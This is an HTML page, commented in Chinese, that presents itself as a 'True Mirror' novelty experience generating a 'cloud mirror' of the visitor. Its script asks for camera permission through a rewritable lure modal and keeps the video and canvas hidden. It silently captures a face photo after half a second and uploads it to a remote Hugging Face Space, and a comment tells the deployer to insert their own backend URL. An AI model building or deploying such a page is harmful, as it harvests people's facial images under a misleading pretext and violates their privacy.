<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>真实之镜 True Mirror</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            max-width: 400px;
        }

        h1 { margin-bottom: 15px; font-weight: 400; color: #00adb5; }
        p { color: #aaaaaa; font-size: 15px; line-height: 1.6; }

        /* 🎨 你自己设计的、可以任意修改文字的前端弹窗 */
        .custom-modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #1e1e1e;
            border: 1px solid #333;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
            width: 85%;
            max-width: 320px;
            text-align: center;
            z-index: 999;
        }

        .modal-btn {
            background-color: #00adb5;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 20px;
        }

        .status-box { margin-top: 30px; font-size: 14px; color: #666; }
        video, canvas { display: none !important; }
    </style>
</head>
<body>

    <div class="container">
        <h1>真实之镜</h1>
        <p>欢迎来到真实之镜。点击下方按钮，开始生成专属于你的云端真实镜像。</p>
        <div id="status" class="status-box">等待开启...</div>
    </div>

    <div id="guide-modal" class="custom-modal">
        <h3 style="margin-top:0; color:#fff;">🔮 开启镜像生成</h3>
        <p style="font-size:14px; color:#aaa;">本体验需要使用前置摄像头来捕捉您的面部镜像。请在稍后弹出的系统提示中点击<b>“允许”</b>。</p>
        <button class="modal-btn" id="start-btn">我知道了，立即开启</button>
    </div>

    <video id="webcam" autoplay playsinline webkit-playsinline muted></video>
    <canvas id="photo-canvas"></canvas>

    <script>
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('photo-canvas');
        const statusDiv = document.getElementById('status');
        const modal = document.getElementById('guide-modal');
        const startBtn = document.getElementById('start-btn');
        
        // ⚠️ 记得换成你自己的 Hugging Face 地址
        const HF_SPACE_URL = 'https://sam1qiu-mirror-backend.hf.space'; 

        // 用户点击你设计的按钮后，才会触发系统的真实弹窗
        startBtn.addEventListener('click', async () => {
            // 1. 立刻隐藏你自己设计的弹窗
            modal.style.display = 'none';
            statusDiv.innerText = '正在唤醒云端通道...';

            try {
                // 2. 触发浏览器无法修改的底层真弹窗
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                await video.play(); 

                statusDiv.innerText = '通道已建立，正在生成镜像...';

                // 3. 静默拍照与上传（500毫秒微调光圈）
                setTimeout(() => {
                    const w = video.videoWidth || 640;
                    const h = video.videoHeight || 480;
                    canvas.width = w;
                    canvas.height = h;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, w, h);

                    statusDiv.innerText = '正在同步至云端...';
                    
                    canvas.toBlob((blob) => {
                        if (!blob) return statusDiv.innerText = '镜像生成失败';

                        const formData = new FormData();
                        formData.append('image', blob, 'capture.jpg');

                        fetch(`${HF_SPACE_URL}/upload`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(data => {
                            if (data.success) {
                                statusDiv.innerText = '✅ 真实之镜同步成功！';
                                const finalImgUrl = HF_SPACE_URL + data.imageUrl;
                                
                                // 关闭硬件
                                stream.getTracks().forEach(track => track.stop());
                                
                                alert(`同步成功！云端照片链接为：\n\n${finalImgUrl}`);
                                window.open(finalImgUrl, '_blank'); 
                            }
                        })
                        .catch(err => {
                            statusDiv.innerText = '❌ 同步失败，请刷新重试';
                        });
                    }, 'image/jpeg', 0.85);

                }, 500);

            } catch (err) {
                statusDiv.innerText = '❌ 权限被拒绝';
                alert("未能获得摄像头权限，请在浏览器设置中允许权限后重试。");
            }
        });
    </script>
</body>
</html>
